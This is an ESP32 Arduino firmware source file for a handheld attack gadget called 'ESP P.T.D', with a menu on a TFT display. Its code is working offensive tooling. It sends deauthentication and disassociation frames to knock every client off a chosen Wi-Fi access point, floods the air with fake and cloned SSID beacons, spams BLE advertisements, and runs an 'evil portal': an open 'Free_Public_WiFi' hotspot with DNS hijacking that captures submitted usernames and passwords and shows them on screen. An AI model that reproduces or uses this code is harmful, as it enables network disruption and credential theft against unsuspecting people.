#include <Arduino.h>
#include <TFT_eSPI.h>
#include <WiFi.h>
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include <NimBLEDevice.h>
#include <DNSServer.h>
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <LittleFS.h>
#include <BleKeyboard.h>   // ESP32-NimBLE-Keyboard

// -------------------- BUTTON PINS ------------------
#define SW_UP    13
#define SW_DOWN  12
#define SW_OK    14

// -------------------- GLOBALS ----------------------
TFT_eSPI tft = TFT_eSPI();

// BLE HID keyboard
BleKeyboard bleKeyboard("ESP_PTD_HID", "programmerz_2024", 100);
bool bleHidMode = false;

enum AppMode {
  MODE_MAIN_MENU,
  MODE_SETTINGS,
  MODE_WIFI_MENU,
  MODE_BLE_MENU,
  MODE_EVIL_PORTAL_MENU,
  MODE_BLE_SNIFFER
};

AppMode currentMode = MODE_MAIN_MENU;

// selection index per menu
int mainMenuIndex   = 0;  // 0..3
int wifiMenuIndex   = 0;  // 0..5 (Back)
int bleMenuIndex    = 0;  // 0..3 (Back)
int evilMenuIndex   = 0;  // 0..2 (Back)

// WiFi data
const int MAX_APS = 20;
String apSSID[MAX_APS];
String apBSSID[MAX_APS];
int   apChannel[MAX_APS];
int   apCount = 0;

// BLE
NimBLEScan        *pBLEScan      = nullptr;
NimBLEAdvertising *pAdvertising  = nullptr;
bool               bleSnifferRunning = false;
int                bleDeviceCount    = 0;

// BLE log
const int BLE_LOG_LINES = 12;
String bleLog[BLE_LOG_LINES];
int    bleLogIndex = 0;
volatile bool bleLogDirty = false;

// Evil Portal
DNSServer dns;
AsyncWebServer epServer(80);
bool evilPortalRunning = false;
const char *EP_SSID     = "Free_Public_WiFi";
const char *EP_PASSWORD = "";
String lastUser = "";
String lastPass = "";

// Attack counters
uint32_t deauthFramesSent = 0;

// -------------------- COLORS ------------------------
#define COL_BG       TFT_BLACK
#define COL_PANEL    TFT_DARKGREY
#define COL_HEADER   TFT_NAVY
#define COL_LINE     TFT_DARKGREY
#define COL_TEXT     TFT_WHITE
#define COL_TITLE    TFT_CYAN
#define COL_ACCENT   TFT_GREEN
#define COL_WARN     TFT_RED
#define COL_HILITE   TFT_BLUE

// -------------------- BUTTON HELPERS ---------------
bool pressedOnce(int pin) {
  static uint8_t lastStateUp   = HIGH;
  static uint8_t lastStateDown = HIGH;
  static uint8_t lastStateOk   = HIGH;

  uint8_t &lastState =
    (pin == SW_UP)   ? lastStateUp :
    (pin == SW_DOWN) ? lastStateDown :
                        lastStateOk;

  uint8_t state = digitalRead(pin);   // LOW = pressed
  bool edge = (lastState == HIGH && state == LOW);
  lastState = state;
  if (!edge) return false;

  delay(20);                          // debounce
  return true;
}

// returns: 'u' (up), 'd' (down), 'e' (enter/back), or Serial char
char getInputKey() {
  if (Serial.available()) return Serial.read();

  if (pressedOnce(SW_UP))   return 'u';
  if (pressedOnce(SW_DOWN)) return 'd';
  if (pressedOnce(SW_OK))   return 'e';

  return 0;
}

// -------------------- UI HELPERS -------------------
void drawHeader(const char *title) {
  tft.fillRect(0, 0, tft.width(), 50, COL_HEADER);
  tft.drawLine(0, 50, tft.width(), 50, COL_LINE);

  tft.setTextSize(3);
  tft.setTextColor(COL_TITLE, COL_HEADER);
  int len = strlen(title);
  int textWidth = len * 18;
  int x = (tft.width() - textWidth) / 2;
  if (x < 0) x = 0;
  tft.setCursor(x, 8);
  tft.print(title);

  const char *name = "programmerz_2024";
  tft.setTextSize(2);
  int namelen = strlen(name);
  int nameWidth = namelen * 12;
  int nx = (tft.width() - nameWidth) / 2;
  if (nx < 0) nx = 0;
  tft.setTextColor(TFT_LIGHTGREY, COL_HEADER);
  tft.setCursor(nx, 32);
  tft.print(name);
}

// status line at bottom
void drawStatus(const char *line) {
  tft.fillRect(0, 300, tft.width(), 20, COL_BG);
  tft.drawLine(0, 300, tft.width(), 300, COL_LINE);
  tft.setTextSize(1);
  tft.setTextColor(COL_TEXT, COL_BG);
  tft.setCursor(4, 305);
  tft.print(line);
}

void drawButtonBar(const char *label, int topY, bool selected, uint16_t colorFill, uint16_t colorText) {
  int h = 38;
  uint16_t fill = selected ? COL_HILITE : colorFill;
  tft.fillRect(0, topY, tft.width(), h, fill);
  tft.drawRect(0, topY, tft.width(), h, COL_LINE);
  tft.setTextSize(2);
  tft.setTextColor(colorText, fill);
  int len = strlen(label);
  int textWidth = len * 12;
  int x = (tft.width() - textWidth) / 2;
  if (x < 0) x = 0;
  tft.setCursor(x, topY + 9);
  tft.print(label);
}

// log buffering, TFT drawn from loop
void bleLogAdd(const String &line) {
  bleLog[bleLogIndex] = line;
  bleLogIndex = (bleLogIndex + 1) % BLE_LOG_LINES;
  bleLogDirty = true;
  Serial.println(line);
}

void drawBleLogToTft() {
  tft.fillRect(0, 55, tft.width(), 240, COL_BG);
  tft.setTextSize(1);
  tft.setTextColor(COL_TEXT, COL_BG);

  int y = 58;
  int idx = bleLogIndex;
  for (int i = 0; i < BLE_LOG_LINES; i++) {
    int j = (idx + i) % BLE_LOG_LINES;
    if (bleLog[j].length() > 0) {
      tft.setCursor(4, y);
      tft.print(bleLog[j]);
      y += 14;
    }
  }
}

void drawLogoAscii(int16_t x, int16_t y) {
  const char *logo[] = {
    "    .*@@@@@@@+      ",
    "  =@@@@@@@@@@#      ",
    "  -@@@@@@@@@@%      ",
    "  .%@@@@@@@@@@.     ",
    "   =@@@@@@@@@@.     ",
    "   .@@@@@@@@@@::..  ",
    "    +@@@@@@@@@@@@@@@",
    ".%@@@@@@@@@@@@@@@+. ",
    "#@@@@@@@@@@*-.      "
  };
  const int LINES = sizeof(logo) / sizeof(logo[0]);

  tft.setTextSize(1);
  tft.setTextColor(TFT_CYAN, COL_BG);
  for (int i = 0; i < LINES; i++) {
    tft.setCursor(x, y + i * 10);
    tft.print(logo[i]);
  }
}

// boot animation: fade logo
void bootAnimation() {
  tft.fillScreen(COL_BG);
  drawHeader("ESP P.T.D");

  uint16_t colors[4] = {
    TFT_DARKGREY,
    TFT_BLUE,
    TFT_CYAN,
    TFT_WHITE
  };

  for (int i = 0; i < 4; i++) {
    tft.fillRect(0, 55, tft.width(), 245, COL_BG);
    tft.setTextSize(1);
    tft.setTextColor(colors[i], COL_BG);

    const char *logo[] = {
      "    .*@@@@@@@+      ",
      "  =@@@@@@@@@@#      ",
      "  -@@@@@@@@@@%      ",
      "  .%@@@@@@@@@@.     ",
      "   =@@@@@@@@@@.     ",
      "   .@@@@@@@@@@::..  ",
      "    +@@@@@@@@@@@@@@@",
      ".%@@@@@@@@@@@@@@@+. ",
      "#@@@@@@@@@@*-.      "
    };
    const int LINES = sizeof(logo) / sizeof(logo[0]);

    for (int j = 0; j < LINES; j++) {
      tft.setCursor(30, 80 + j * 12);
      tft.print(logo[j]);
    }

    tft.setTextSize(2);
    tft.setTextColor(colors[i], COL_BG);
    tft.setCursor(30, 200);
    tft.print("programmerz_2024");

    delay(250);
  }

  delay(400);
}

// -------------------- SCREENS ----------------------
void drawMainMenu() {
  tft.fillScreen(COL_BG);
  drawHeader("MAIN MENU");

  drawButtonBar("Settings",   60,  (mainMenuIndex==0), COL_PANEL, COL_TEXT);
  drawButtonBar("WiFi tools", 102, (mainMenuIndex==1), COL_BG,    COL_TEXT);
  drawButtonBar("BLE tools",  144, (mainMenuIndex==2), COL_BG,    COL_TEXT);
  drawButtonBar("Evil portal",186, (mainMenuIndex==3), COL_BG,    COL_TEXT);

  drawStatus("Mode: Idle");
}

void drawSettingsScreen() {
  tft.fillScreen(COL_BG);
  drawHeader("SETTINGS");

  drawLogoAscii(12, 60);

  tft.setTextSize(2);
  tft.setTextColor(COL_ACCENT, COL_BG);
  tft.setCursor(10, 155);
  tft.println("Device info");

  tft.setTextSize(1);
  tft.setTextColor(COL_TEXT, COL_BG);
  tft.setCursor(10, 180);
  tft.print("Chip : ");
  tft.println(ESP.getChipModel());

  tft.setCursor(10, 195);
  tft.print("Flash: ");
  tft.print(ESP.getFlashChipSize() / (1024 * 1024));
  tft.println(" MB");

  tft.setCursor(10, 210);
  tft.print("Name : ");
  tft.println("ESP P.T.D");

  drawButtonBar("Back", 238, true, COL_PANEL, COL_TEXT);
  drawStatus("Mode: Info");
}

void drawWifiMenu() {
  tft.fillScreen(COL_BG);
  drawHeader("WIFI TOOLS");

  drawButtonBar("Scan APs",          60,  (wifiMenuIndex==0), COL_PANEL, COL_TEXT);
  drawButtonBar("Random SSID spam", 102, (wifiMenuIndex==1), COL_BG,    COL_TEXT);
  drawButtonBar("Funny SSID spam",  144, (wifiMenuIndex==2), COL_BG,    COL_TEXT);
  drawButtonBar("Clone SSID spam",  186, (wifiMenuIndex==3), COL_BG,    COL_TEXT);
  drawButtonBar("Deauth AP",        228, (wifiMenuIndex==4), COL_BG,    COL_WARN);
  drawButtonBar("Back",             270, (wifiMenuIndex==5), COL_PANEL, COL_TEXT);

  char buf[40];
  snprintf(buf, sizeof(buf), "Mode: WiFi menu | APs: %d", apCount);
  drawStatus(buf);
}

void drawBleMenu() {
  tft.fillScreen(COL_BG);
  drawHeader("BLE TOOLS");

  drawButtonBar("BLE sniffer",   60,  (bleMenuIndex==0), COL_PANEL, COL_TEXT);
  drawButtonBar("Beacon spam",   102, (bleMenuIndex==1), COL_BG,    COL_TEXT);
  drawButtonBar("BLE HID macro", 144, (bleMenuIndex==2), COL_BG,    COL_ACCENT);
  drawButtonBar("Back",          228, (bleMenuIndex==3), COL_PANEL, COL_TEXT);

  char buf[40];
  snprintf(buf, sizeof(buf), "Mode: BLE menu | Devices: %d", bleDeviceCount);
  drawStatus(buf);
}

void drawEvilPortalMenu() {
  tft.fillScreen(COL_BG);
  drawHeader("EVIL PORTAL");

  drawButtonBar("Start portal", 60,  (evilMenuIndex==0), COL_PANEL, COL_TEXT);
  drawButtonBar("Stop portal",  102, (evilMenuIndex==1), COL_BG,    COL_TEXT);

  tft.setTextSize(1);
  tft.setTextColor(COL_TEXT, COL_BG);
  tft.setCursor(10, 150);
  tft.println("SSID : Free_Public_WiFi");
  tft.println("HTML : /index.html (LittleFS)");

  drawButtonBar("Back", 228, (evilMenuIndex==2), COL_PANEL, COL_TEXT);

  drawStatus(evilPortalRunning ? "Mode: Portal ON" : "Mode: Portal OFF");
}

// -------------------- WIFI FUNCTIONS ---------------
const char *funnySSIDs[] = {
  "FREE_WIFI",
  "404_WIFI_NOT_FOUND",
  "NSA_VAN_13",
  "Virus_AP",
  "ESP_PTD_TEST",
  "programmerz_net",
  "Coffee_WiFi",
  "School_WiFi_2G"
};
const int NUM_FUNNY = sizeof(funnySSIDs) / sizeof(funnySSIDs[0]);

uint8_t beaconFrame[128] = {
  0x80, 0x00,
  0x00, 0x00,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x01,
  0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x01,
  0x00, 0x00,
  0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00,
  0x64, 0x00,
  0x01, 0x04,
  0x00,
  0x00,
};

void setRandomMac(uint8_t *mac) {
  mac[0] = 0x02;
  for (int i = 1; i < 6; i++) mac[i] = random(0x00, 0xFF);
}

void sendBeacon(const char *ssid) {
  uint8_t frame[128];
  memcpy(frame, beaconFrame, sizeof(beaconFrame));

  uint8_t mac[6];
  setRandomMac(mac);
  memcpy(&frame[10], mac, 6);
  memcpy(&frame[16], mac, 6);

  uint8_t ssidLen = strlen(ssid);
  if (ssidLen > 32) ssidLen = 32;

  frame[36] = 0x00;
  frame[37] = ssidLen;
  memcpy(&frame[38], ssid, ssidLen);

  int frameLen = 38 + ssidLen;
  esp_wifi_80211_tx(WIFI_IF_STA, frame, frameLen, false);
}

void runWifiScan() {
  tft.fillScreen(COL_BG);
  drawHeader("SCAN RESULTS");

  tft.setTextSize(1);
  tft.setTextColor(COL_TEXT, COL_BG);
  tft.setCursor(8, 60);
  tft.println("Idx  SSID                RSSI   ch");
  tft.drawLine(0, 72, tft.width(), 72, COL_LINE);

  int n = WiFi.scanNetworks();
  apCount = 0;
  int y = 78;

  for (int i = 0; i < n && i < MAX_APS; i++) {
    apSSID[apCount]    = WiFi.SSID(i);
    apBSSID[apCount]   = WiFi.BSSIDstr(i);
    apChannel[apCount] = WiFi.channel(i);
    apCount++;

    String s = apSSID[i];
    if (s.length() > 18) s = s.substring(0, 17) + "...";

    if (i < 10) {
      tft.setCursor(8, y);
      tft.printf("%d   ", i);
      tft.setCursor(30, y);
      tft.print(s);
      tft.setCursor(190, y);
      tft.printf("%4d", WiFi.RSSI(i));
      tft.setCursor(230, y);
      tft.print("ch ");
      tft.print(apChannel[i]);
      y += 12;
    }

    Serial.print(i); Serial.print(": "); Serial.println(apSSID[i]);
  }

  char buf[40];
  snprintf(buf, sizeof(buf), "Mode: Scan done | APs: %d", apCount);
  drawStatus(buf);

  tft.setCursor(8, 260);
  tft.println("OK = back");

  while (true) {
    char k = getInputKey();
    if (k == 'e' || k == '0') break;
  }
}

void spamRandomLoop() {
  tft.fillScreen(COL_BG);
  drawHeader("RANDOM SPAM");

  tft.setTextSize(2);
  tft.setTextColor(COL_WARN, COL_BG);
  tft.setCursor(10, 80);
  tft.println("Spamming...");
  tft.setTextSize(1);
  tft.setCursor(10, 260);
  tft.setTextColor(COL_TEXT, COL_BG);
  tft.println("OK = back");
  drawStatus("Mode: WiFi spam (random)");

  while (true) {
    char k = getInputKey();
    if (k == 'e' || k == '0') break;

    for (int i = 0; i < 30; i++) {
      char buf[20];
      snprintf(buf, sizeof(buf), "ESP_PTD_%02X", random(0, 0xFF));
      sendBeacon(buf);
      delay(3);
    }
  }
}

void spamFunnyLoop() {
  tft.fillScreen(COL_BG);
  drawHeader("FUNNY SPAM");

  tft.setTextSize(2);
  tft.setTextColor(COL_WARN, COL_BG);
  tft.setCursor(10, 80);
  tft.println("Spamming...");
  tft.setTextSize(1);
  tft.setCursor(10, 260);
  tft.setTextColor(COL_TEXT, COL_BG);
  tft.println("OK = back");
  drawStatus("Mode: WiFi spam (funny)");

  while (true) {
    char k = getInputKey();
    if (k == 'e' || k == '0') break;

    for (int i = 0; i < NUM_FUNNY; i++) {
      sendBeacon(funnySSIDs[i]);
      delay(5);
    }
  }
}

void spamCloneLoop() {
  tft.fillScreen(COL_BG);
  drawHeader("CLONE SPAM");

  tft.setTextSize(2);
  tft.setTextColor(COL_WARN, COL_BG);
  tft.setCursor(10, 80);
  tft.println("Spamming...");
  tft.setTextSize(1);
  tft.setCursor(10, 260);
  tft.setTextColor(COL_TEXT, COL_BG);
  tft.println("OK = back");
  drawStatus("Mode: WiFi spam (clone)");

  while (true) {
    char k = getInputKey();
    if (k == 'e' || k == '0') break;
    if (apCount == 0) continue;

    for (int i = 0; i < apCount; i++) {
      sendBeacon(apSSID[i].c_str());
      delay(5);
    }
  }
}




// -------------------- DEAUTH / TARGETED AP ------------------
void parseBSSID(const String &bssidStr, uint8_t mac[6]) {
  int values[6];
  sscanf(bssidStr.c_str(), "%x:%x:%x:%x:%x:%x",
         &values[0], &values[1], &values[2],
         &values[3], &values[4], &values[5]);
  for (int i = 0; i < 6; i++) mac[i] = (uint8_t)values[i];
}

// Deauther-style deauth / disassoc sequence (AP + optional STA) [web:129][web:168]
void sendDeauthAdvanced(const uint8_t apMac[6], const uint8_t stMac[6], uint8_t reason, uint8_t ch) {
  const uint16_t packetSize = 26;
  uint8_t pkt[packetSize];

  memset(pkt, 0, packetSize);

  // AP -> STA direction
  memcpy(&pkt[4],  stMac, 6);   // receiver (DA)
  memcpy(&pkt[10], apMac, 6);   // sender (SA)
  memcpy(&pkt[16], apMac, 6);   // BSSID
  pkt[24] = reason;             // reason code (1 = unspecified) [web:171]

  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);

  // 1) AP -> STA deauth
  pkt[0] = 0xC0;
  esp_wifi_80211_tx(WIFI_IF_STA, pkt, packetSize, false);

  // 2) AP -> STA disassoc
  pkt[0] = 0xA0;
  esp_wifi_80211_tx(WIFI_IF_STA, pkt, packetSize, false);

  // If station MAC is not broadcast, also spoof STA -> AP
  bool isBroadcast = true;
  for (int i = 0; i < 6; i++) {
    if (stMac[i] != 0xFF) { isBroadcast = false; break; }
  }

  if (!isBroadcast) {
    // 3) STA -> AP deauth
    memcpy(&pkt[4],  apMac, 6);   // receiver
    memcpy(&pkt[10], stMac, 6);   // sender
    memcpy(&pkt[16], stMac, 6);   // BSSID
    pkt[0] = 0xC0;
    esp_wifi_80211_tx(WIFI_IF_STA, pkt, packetSize, false);

    // 4) STA -> AP disassoc
    pkt[0] = 0xA0;
    esp_wifi_80211_tx(WIFI_IF_STA, pkt, packetSize, false);
  }
}

// Target one AP (broadcast to all its clients)
void sendDeauth(const uint8_t bssid[6], uint8_t ch) {
  uint8_t broadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  uint8_t reason = 1;  // standard unspecified reason [web:171]
  sendDeauthAdvanced(bssid, broadcast, reason, ch);
  deauthFramesSent += 4;  // up to 4 frames per call
}

int selectApForDeauth() {
  if (apCount == 0) return -1;

  int sel = 0;
  while (true) {
    tft.fillScreen(COL_BG);
    drawHeader("SELECT AP");

    tft.setTextSize(1);
    int y = 60;
    for (int i = 0; i < apCount && i < 8; i++) {
      bool selected = (i == sel);
      tft.setTextColor(selected ? COL_ACCENT : COL_TEXT, COL_BG);
      tft.setCursor(8, y);
      tft.printf("%c %d: ", selected ? '>' : ' ', i);
      tft.print(apSSID[i]);
      y += 12;
    }
    tft.setCursor(8, 260);
    tft.setTextColor(COL_TEXT, COL_BG);
    tft.println("UP/DOWN, OK=deauth, 0=cancel");
    drawStatus("Mode: Deauth select");

    char k = getInputKey();
    if (k == 'u' && sel > 0) sel--;
    else if (k == 'd' && sel < apCount - 1) sel++;
    else if (k == 'e') return sel;
    else if (k == '0') return -1;
  }
}
void runDeauthLoop() {
  if (apCount == 0) {
    Serial.println("No APs scanned yet.");
    return;
  }

  int idx = selectApForDeauth();
  if (idx < 0) return;   // canceled

  uint8_t bssid[6];
  parseBSSID(apBSSID[idx], bssid);
  int ch = apChannel[idx];
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  deauthFramesSent = 0;

  const int DEAUTHS_PER_BURST = 5;

  tft.fillScreen(COL_BG);
  drawHeader("DEAUTH RUNNING");
  tft.setTextSize(2);
  tft.setTextColor(COL_WARN, COL_BG);
  tft.setCursor(10, 80);
  tft.print("AP: ");
  tft.println(apSSID[idx]);
  tft.setTextSize(1);
  tft.setCursor(10, 260);
  tft.setTextColor(COL_TEXT, COL_BG);
  tft.println("OK = back");

  while (true) {
    char k = getInputKey();
    if (k == 'e' || k == '0') break;

    for (int i = 0; i < DEAUTHS_PER_BURST; i++) {
      sendDeauth(bssid, ch);
      delay(3);
    }

    char buf[40];
    snprintf(buf, sizeof(buf), "Mode: Deauth | Frames: %lu", (unsigned long)deauthFramesSent);
    drawStatus(buf);
  }
}



  

// -------------------- BLE SNIFFER ------------------
class SnifferCallbacks : public NimBLEScanCallbacks {
  void onDiscovered(const NimBLEAdvertisedDevice* dev) override {
    String s = "[NEW] ";
    s += dev->getAddress().toString().c_str();
    bleLogAdd(s);
    bleDeviceCount++;
  }
  void onResult(const NimBLEAdvertisedDevice* dev) override {
    String s = "[ADV] ";
    s += dev->getAddress().toString().c_str();
    s += " RSSI:";
    s += dev->getRSSI();
    bleLogAdd(s);
  }
  void onScanEnd(const NimBLEScanResults& results, int reason) override {
    // no restart here; scan is continuous
  }
} snifferCallbacks;

void startBleSniffer() {
  for (int i = 0; i < BLE_LOG_LINES; i++) bleLog[i] = "";
  bleLogIndex = 0;
  bleDeviceCount = 0;
  bleLogDirty = true;

  tft.fillScreen(COL_BG);
  drawHeader("BLE SNIFFER");

  tft.setTextSize(1);
  tft.setTextColor(COL_TEXT, COL_BG);
  tft.setCursor(10, 60);
  tft.println("Live BLE adverts");
  tft.setCursor(10, 260);
  tft.println("OK = back");
  drawStatus("Mode: BLE sniffer");

  pBLEScan->setScanCallbacks(&snifferCallbacks, false);
  pBLEScan->setMaxResults(0);
  pBLEScan->setActiveScan(true);
  pBLEScan->setInterval(100);
  pBLEScan->setWindow(80);
  pBLEScan->start(0, true, false);   // continuous, non-blocking

  bleSnifferRunning = true;
  currentMode = MODE_BLE_SNIFFER;
}

void stopBleSniffer() {
  if (pBLEScan) {
    pBLEScan->stop();
    pBLEScan->setScanCallbacks(nullptr);
  }
  bleSnifferRunning = false;
  drawBleMenu();
  currentMode = MODE_BLE_MENU;
}

// BLE beacon spam
void startBleBeaconSpam() {
  tft.fillScreen(COL_BG);
  drawHeader("BLE SPAM");

  tft.setTextSize(2);
  tft.setTextColor(COL_WARN, COL_BG);
  tft.setCursor(10, 80);
  tft.println("Spamming...");
  tft.setTextSize(1);
  tft.setCursor(10, 260);
  tft.setTextColor(COL_TEXT, COL_BG);
  tft.println("OK = back");
  drawStatus("Mode: BLE spam");

  while (true) {
    char k = getInputKey();
    if (k == 'e' || k == '0') break;

    char name[16];
    snprintf(name, sizeof(name), "ESP_BLE_%02X", random(0, 0xFF));
    NimBLEDevice::setDeviceName(name);

    NimBLEAdvertisementData adv;
    adv.setName(name);
    pAdvertising->setAdvertisementData(adv);
    pAdvertising->start();
    delay(150);
    pAdvertising->stop();
  }
}

// -------------------- BLE HID (simple text) ----------------
void runBleHidSimpleText() {
  tft.fillScreen(COL_BG);
  drawHeader("BLE HID");

  tft.setTextSize(1);
  tft.setTextColor(COL_TEXT, COL_BG);
  tft.setCursor(10, 60);
  tft.println("Pair with: ESP_PTD_HID");
  tft.println("Then it will type once.");
  tft.setCursor(10, 260);
  tft.println("OK = back");
  drawStatus("Mode: BLE HID text");

  Serial.println("[HID] waiting for connection");

  unsigned long start = millis();
  while (!bleKeyboard.isConnected()) {
    char k = getInputKey();
    if (k == 'e' || k == '0') {
      drawStatus("Canceled, no HID");
      return;
    }
    if (millis() - start > 15000) {
      drawStatus("No BLE host, timeout");
      return;
    }
    delay(50);
  }

  bleKeyboard.print("Hello from ESP P.T.D by programmerz_2024!\n");
  Serial.println("[HID] text sent");
  delay(200);

  drawStatus("Text sent, OK=back");

  while (true) {
    char k = getInputKey();
    if (k == 'e' || k == '0') break;
    delay(20);
  }
}

// -------------------- EVIL PORTAL ------------------
void drawPortalCreds() {
  // clear area where creds are shown
  tft.fillRect(0, 110, tft.width(), 80, COL_BG);
  tft.setTextSize(1);
  tft.setTextColor(COL_TEXT, COL_BG);
  tft.setCursor(10, 120);
  tft.println("Last creds:");
  tft.print("U: ");
  tft.println(lastUser);
  tft.print("P: ");
  tft.println(lastPass);
}

void startEvilPortal() {
  if (evilPortalRunning) return;

  if (!LittleFS.begin()) {
    Serial.println("[EP] LittleFS mount failed");
    return;
  }

  WiFi.disconnect(true);
  WiFi.mode(WIFI_AP);
  WiFi.softAP(EP_SSID, EP_PASSWORD);
  delay(100);

  IPAddress apIP = WiFi.softAPIP();
  Serial.print("[EP] AP IP: ");
  Serial.println(apIP);

  dns.start(53, "*", apIP);

  epServer.on("/", HTTP_ANY, [](AsyncWebServerRequest *req){
    req->send(LittleFS, "/index.html", "text/html");
  });

  epServer.onNotFound([](AsyncWebServerRequest *req){
    req->send(LittleFS, "/index.html", "text/html");
  });

  epServer.on("/login", HTTP_POST, [](AsyncWebServerRequest *req){
    lastUser = req->hasParam("user", true) ? req->getParam("user", true)->value() : "";
    lastPass = req->hasParam("pass", true) ? req->getParam("pass", true)->value() : "";
    Serial.printf("[EP] user=%s pass=%s\n", lastUser.c_str(), lastPass.c_str());
    req->send(200, "text/html", "<h3>Connecting...</h3>");
  });

  epServer.begin();
  evilPortalRunning = true;

  tft.fillScreen(COL_BG);
  drawHeader("PORTAL ACTIVE");
  tft.setTextSize(2);
  tft.setTextColor(COL_ACCENT, COL_BG);
  tft.setCursor(10, 80);
  tft.print("SSID: ");
  tft.println(EP_SSID);

  drawPortalCreds();

  tft.setTextSize(1);
  tft.setCursor(10, 260);
  tft.setTextColor(COL_TEXT, COL_BG);
  tft.println("OK = stop");
  drawStatus("Mode: Portal ON");
}

void stopEvilPortal() {
  if (!evilPortalRunning) return;

  dns.stop();
  epServer.end();

  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_STA);
  WiFi.disconnect(true);
  delay(100);

  evilPortalRunning = false;
  drawEvilPortalMenu();
}

// -------------------- SETUP & LOOP -----------------
void setup() {
  Serial.begin(115200);
  delay(500);

  pinMode(SW_UP,   INPUT_PULLUP);
  pinMode(SW_DOWN, INPUT_PULLUP);
  pinMode(SW_OK,   INPUT_PULLUP);

  WiFi.mode(WIFI_STA);
  WiFi.disconnect(true);
  delay(100);
  esp_wifi_set_promiscuous(false);

  NimBLEDevice::init("ESP_PTD");
  bleKeyboard.begin();                // start HID right after init

  pBLEScan = NimBLEDevice::getScan();
  pBLEScan->setActiveScan(true);
  pBLEScan->setInterval(100);
  pBLEScan->setWindow(80);
  pAdvertising = NimBLEDevice::getAdvertising();

  tft.init();
  tft.setRotation(1);
  tft.fillScreen(COL_BG);

  bootAnimation();
  drawMainMenu();

  Serial.println("ESP P.T.D ready.");
  Serial.println("Use switches or Serial: 1-4");
}

void loop() {
  if (evilPortalRunning) {
    dns.processNextRequest();

    // keep creds region updated
    drawPortalCreds();

    char k = getInputKey();
    if (k == 'e' || k == '0') {
      stopEvilPortal();
    }
    return;
  }

  if (currentMode == MODE_BLE_SNIFFER) {
    char k = getInputKey();
    if (k == 'e' || k == '0') {
      stopBleSniffer();
    } else {
      if (bleLogDirty) {
        bleLogDirty = false;
        drawBleLogToTft();
      }
      char buf[40];
      snprintf(buf, sizeof(buf), "Mode: BLE sniff | Devices: %d", bleDeviceCount);
      drawStatus(buf);
    }
    return;
  }

  char c = getInputKey();
  if (!c) return;

  // MAIN MENU
  if (currentMode == MODE_MAIN_MENU) {
    if (c == 'u') {
      if (mainMenuIndex > 0) mainMenuIndex--;
      drawMainMenu();
    } else if (c == 'd') {
      if (mainMenuIndex < 3) mainMenuIndex++;
      drawMainMenu();
    } else if (c == 'e') {
      if      (mainMenuIndex == 0) { currentMode = MODE_SETTINGS;         drawSettingsScreen(); }
      else if (mainMenuIndex == 1) { currentMode = MODE_WIFI_MENU;        wifiMenuIndex  = 0; drawWifiMenu(); }
      else if (mainMenuIndex == 2) { currentMode = MODE_BLE_MENU;         bleMenuIndex   = 0; drawBleMenu(); }
      else if (mainMenuIndex == 3) { currentMode = MODE_EVIL_PORTAL_MENU; evilMenuIndex  = 0; drawEvilPortalMenu(); }
    } else if (c >= '1' && c <= '4') {
      mainMenuIndex = (c - '1');
      if      (mainMenuIndex == 0) { currentMode = MODE_SETTINGS;         drawSettingsScreen(); }
      else if (mainMenuIndex == 1) { currentMode = MODE_WIFI_MENU;        wifiMenuIndex  = 0; drawWifiMenu(); }
      else if (mainMenuIndex == 2) { currentMode = MODE_BLE_MENU;         bleMenuIndex   = 0; drawBleMenu(); }
      else if (mainMenuIndex == 3) { currentMode = MODE_EVIL_PORTAL_MENU; evilMenuIndex  = 0; drawEvilPortalMenu(); }
    }
    return;
  }

  // SETTINGS
  if (currentMode == MODE_SETTINGS) {
    if (c == 'e' || c == '0') {
      currentMode = MODE_MAIN_MENU;
      drawMainMenu();
    }
    return;
  }

  // WIFI MENU
  if (currentMode == MODE_WIFI_MENU) {
    if (c == 'u') {
      if (wifiMenuIndex > 0) wifiMenuIndex--;
      drawWifiMenu();
    } else if (c == 'd') {
      if (wifiMenuIndex < 5) wifiMenuIndex++;
      drawWifiMenu();
    } else if (c == 'e') {
      if      (wifiMenuIndex == 0) { runWifiScan(); }
      else if (wifiMenuIndex == 1) { spamRandomLoop(); }
      else if (wifiMenuIndex == 2) { spamFunnyLoop(); }
      else if (wifiMenuIndex == 3) { spamCloneLoop(); }
      else if (wifiMenuIndex == 4) { runDeauthLoop(); }
      else if (wifiMenuIndex == 5) { currentMode = MODE_MAIN_MENU; drawMainMenu(); return; }
      drawWifiMenu();
    } else if (c == '0') {
      currentMode = MODE_MAIN_MENU;
      drawMainMenu();
    }
    return;
  }

  // BLE MENU
  if (currentMode == MODE_BLE_MENU) {
    if (c == 'u') {
      if (bleMenuIndex > 0) bleMenuIndex--;
      drawBleMenu();
    } else if (c == 'd') {
      if (bleMenuIndex < 3) bleMenuIndex++;
      drawBleMenu();
    } else if (c == 'e') {
      if      (bleMenuIndex == 0) startBleSniffer();
      else if (bleMenuIndex == 1) { startBleBeaconSpam(); drawBleMenu(); }
      else if (bleMenuIndex == 2) { runBleHidSimpleText(); drawBleMenu(); }
      else if (bleMenuIndex == 3) { currentMode = MODE_MAIN_MENU; drawMainMenu(); }
    } else if (c == '0') {
      currentMode = MODE_MAIN_MENU;
      drawMainMenu();
    }
    return;
  }

  // EVIL PORTAL MENU
  if (currentMode == MODE_EVIL_PORTAL_MENU) {
    if (c == 'u') {
      if (evilMenuIndex > 0) evilMenuIndex--;
      drawEvilPortalMenu();
    } else if (c == 'd') {
      if (evilMenuIndex < 2) evilMenuIndex++;
      drawEvilPortalMenu();
    } else if (c == 'e') {
      if      (evilMenuIndex == 0) startEvilPortal();
      else if (evilMenuIndex == 1) stopEvilPortal();
      else if (evilMenuIndex == 2) { currentMode = MODE_MAIN_MENU; drawMainMenu(); }
    } else if (c == '0') {
      currentMode = MODE_MAIN_MENU;
      drawMainMenu();
    }
    return;
  }
}
